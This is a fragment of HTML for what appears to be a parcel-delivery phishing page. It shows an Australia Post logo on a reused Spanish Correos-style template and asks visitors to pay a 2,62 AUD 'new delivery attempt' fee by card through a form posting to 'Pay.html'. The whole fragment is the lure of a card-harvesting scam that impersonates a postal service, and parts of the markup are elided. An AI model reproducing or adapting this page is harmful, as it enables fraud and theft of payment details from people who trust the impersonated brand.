...
<form name="formInterfaz" method="post" action="Pay.html#0003958499y38994==" id="formInterfaz">
    <div>
            ...
            <div id="cabecera" class="container ogilvy-bg-amarillo">
                <div class="row">
                    <div class="col-xs-12 text-center ogilvy-header">
                        <img src="https://www.and.org.au/data/2021/ap_primarylogo_red_rgb.png" id="logoCorreos"
                        ...
                        <div class="row">
                            <div class="col-xs-12 col-sm-6 col-sm-offset-3 col-lg-5 col-lg-offset-3 text-center ogilvy-espacioseccion">
                                    ...
                                    <div style="margin-left: auto; margin-left: auto; text-align: center;"
                                        ...
                                        <div style="margin-left: auto; margin-left: auto; text-align: center;"
                                            ...
                                            <span id="concepto" class="descripcionPago" style="font-weight:bold;">PASO 1 : </span><span
                                                    id="conceptovalor" style="font-weight:normal;">PAYMENT OF EXPENSES OF THE NEW DELIVERY ATTEMPT</span>
                                        </div>
                                    </div>
                                ...
                                <div class="ogilvy-titular">
                                    <span id="lbTitle" class="titulo">Imported : 2,62 AUD</span>
                                </div>
                                <div id="divSubtitularPago" class="ogilvy-subtitular ogilvy-subtitular-grande">

                                    <span id="lbSubTittle" class="subtitulo">Payment method :</span><br>
                                                ...
                                                <td style="width:370px;" align="left">
                                                    <div class="div_relleno"
                                                        ...
                                                        <span id="GridViewPagoSimple_ctl02_lbDesPagoSimple"
                                                              class="descripcionPago">CARD</span>
                        ...
                        <div class="col-xs-12 col-sm-6 col-sm-offset-3 col-lg-5 col-lg-offset-3 ogilvy-seleccionpago ogilvy-espacioseccion">
                            <div class="col-xs-12">
                                <div class="ogilvy-botonrelleno ogilvy-Sweep">
                                    <input type="button" name="bSiguiente" value="PAY AND CONTINUE"
                                ...
                                <div class="ogilvy-botonborder ogilvy-border-fade">
                                    <input type="button" name="bAnterior" value="Cancel"
